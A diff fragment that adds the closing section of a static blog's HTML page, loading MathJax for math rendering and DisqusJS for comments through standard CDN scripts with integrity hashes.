+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
